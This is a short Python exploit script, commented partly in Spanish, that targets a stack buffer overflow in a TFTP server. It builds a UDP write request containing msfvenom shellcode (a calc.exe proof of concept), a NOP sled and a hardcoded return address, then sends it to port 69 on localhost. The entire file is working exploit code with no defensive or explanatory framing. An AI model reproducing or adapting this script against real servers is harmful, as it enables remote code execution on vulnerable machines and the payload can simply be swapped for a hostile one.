# -*- coding: cp1252 -*-
import socket

# msfvenom -p windows/exec cmd=calc.exe -a x86 -f c -b '\x90'
# 220 bytes
shellcode = ("\xda\xc9\xd9\x74\x24\xf4\xbb\x16\x85\xba\x16\x58\x29\xc9\xb1"
"\x31\x31\x58\x18\x03\x58\x18\x83\xe8\xea\x67\x4f\xea\xfa\xea"
"\xb0\x13\xfa\x8a\x39\xf6\xcb\x8a\x5e\x72\x7b\x3b\x14\xd6\x77"
"\xb0\x78\xc3\x0c\xb4\x54\xe4\xa5\x73\x83\xcb\x36\x2f\xf7\x4a"
"\xb4\x32\x24\xad\x85\xfc\x39\xac\xc2\xe1\xb0\xfc\x9b\x6e\x66"
"\x11\xa8\x3b\xbb\x9a\xe2\xaa\xbb\x7f\xb2\xcd\xea\xd1\xc9\x97"
"\x2c\xd3\x1e\xac\x64\xcb\x43\x89\x3f\x60\xb7\x65\xbe\xa0\x86"
"\x86\x6d\x8d\x27\x75\x6f\xc9\x8f\x66\x1a\x23\xec\x1b\x1d\xf0"
"\x8f\xc7\xa8\xe3\x37\x83\x0b\xc8\xc6\x40\xcd\x9b\xc4\x2d\x99"
"\xc4\xc8\xb0\x4e\x7f\xf4\x39\x71\x50\x7d\x79\x56\x74\x26\xd9"
"\xf7\x2d\x82\x8c\x08\x2d\x6d\x70\xad\x25\x83\x65\xdc\x67\xc9"
"\x78\x52\x12\xbf\x7b\x6c\x1d\xef\x13\x5d\x96\x60\x63\x62\x7d"
"\xc5\x9b\x28\xdc\x6f\x34\xf5\xb4\x32\x59\x06\x63\x70\x64\x85"
"\x86\x08\x93\x95\xe2\x0d\xdf\x11\x1e\x7f\x70\xf4\x20\x2c\x71"
"\xdd\x42\xb3\xe1\xbd\xaa\x56\x82\x24\xb3")

# 225 bytes tenemos de espacio
# 0x7e429353 ret
#crash = '\x41'*226 + '\x53\x93\x42\x7e'
crash = '\x90'*6 + shellcode + '\x53\x93\x42\x7e'
exploit	= "\x00\x02" + crash + "\x83\xc4\x28\xc3\x00netascii\x00"

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
client.sendto(exploit, ('127.0.0.1', 69))
